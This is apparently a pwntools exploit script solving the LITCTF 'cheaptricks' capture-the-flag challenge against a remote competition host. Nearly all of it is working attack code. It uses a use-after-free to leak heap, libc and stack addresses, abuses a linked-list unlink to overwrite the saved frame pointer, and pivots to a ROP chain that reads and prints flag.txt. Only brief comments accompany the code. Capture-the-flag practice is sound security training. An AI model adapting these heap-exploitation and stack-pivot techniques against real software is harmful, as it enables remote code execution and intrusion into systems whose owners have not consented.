from pwn import *

#init

e = ELF('./cheaptricks')
libc = ELF('./libc-2.31.so')

context.binary = e

#p = process(e.path)
p = remote('cheaptricks.litctf.live', 1337)

#funcs

def addp(s = 'a'):
    p.sendlineafter('?', '1')
    p.sendlineafter('?', str(len(s)));
    p.sendlineafter('.', s)
    p.sendlineafter('.', '69')
    p.sendlineafter('.', '69')
    p.sendlineafter('.', '69')

def addr(x, s = 'a'):
    p.sendlineafter('?', '2')
    p.sendlineafter('.', str(x))
    p.sendlineafter('.', '69')
    p.sendlineafter('?', str(len(s)))
    p.sendlineafter('.', s)

def frer(x, y = 'a'):
    p.sendlineafter('?', '3')
    p.sendlineafter('.', str(x))
    p.sendlineafter('?', str(y))

def rd(x):
    p.sendlineafter('?', '4')
    p.sendlineafter('?', str(x))
    p.recvuntil('Description: ')
    return u64(p.recvline(keepends = False).ljust(8, b'\x00'))

def cpy(x):
    p.sendlineafter('?', '5')
    p.sendlineafter('?', str(x))

def ff(x, y = 1, z = False):
    addp() #x

    addr(x, 'a' * y)
    addr(x)

    cpy(x) #x + 1

    if z:
        frer(x, 0)

    frer(x + 1, 0)

    return rd(x + 1)

#vars

main_arena_off = 0x1bebe0
environ_off = libc.sym['environ']

log.info('Main arena libc off: ' + hex(main_arena_off))
log.info('Environ libc off: ' + hex(environ_off))

#exploit

#bad copying mechanism doesn't change bk ptrs, gives uaf read to leak heap address

heap = ff(0, 0x1, True) - 0x1370 #0, 1

log.info('Heap adr: ' + hex(heap))

#do same thing with larger size to leak libc address

libc_off = ff(2, 0x500) - main_arena_off #2, 3

log.info('Libc off adr: ' + hex(libc_off))

#leak stk address from environ by overwriting description address using uaf

addp(b'\x00' * 0x18 + p64(libc_off + environ_off)) #4

stk_rbp = rd(3) - 0x128
log.info('Stk rbp adr: ' + hex(stk_rbp))

#write heap onto stk rbp to pivot using linked list unlink mechanism with uaf

ff(5) #5, 6

addp(p64(heap + 0x1ec8) + p64(stk_rbp) + b'\x00' * 0x10) #7

frer(6, 0)

#write rop chain on heap

libc.address = libc_off

rop = ROP(libc, heap + 0x1ed0)
rop.fopen("flag.txt", "r")
rop.read(0x3, heap, 0x40)
rop.puts(heap)
rop.exit(0)

log.info('Rop chain: \n' + rop.dump())

addp(rop.chain()) #8

#pivot to heap and call chain

p.sendlineafter('?', '7')

#pray for flag

p.interactive()
